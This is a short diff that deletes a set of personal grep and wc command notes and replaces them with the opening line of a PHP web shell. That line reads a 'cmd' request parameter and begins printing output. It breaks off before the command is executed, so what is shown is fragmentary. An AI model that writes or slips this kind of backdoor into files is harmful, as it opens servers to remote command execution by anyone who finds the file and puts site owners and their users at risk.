@@ -1,8 +1,1 @@
-OR in grep: grep 'false\|nologin'
-to count lines: wc -l <filename>
-GREP 4 lines before match:
-grep -B4 'blabla'
-GREP after
-GREP UTF-16: grep -a 'T.r.u.e' dont forget the dots because UTF-16 adds fillers
-GREP 5 lines BEOFRE and AFTER:
-grep -A 5 -B 5 -r blabla
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd =
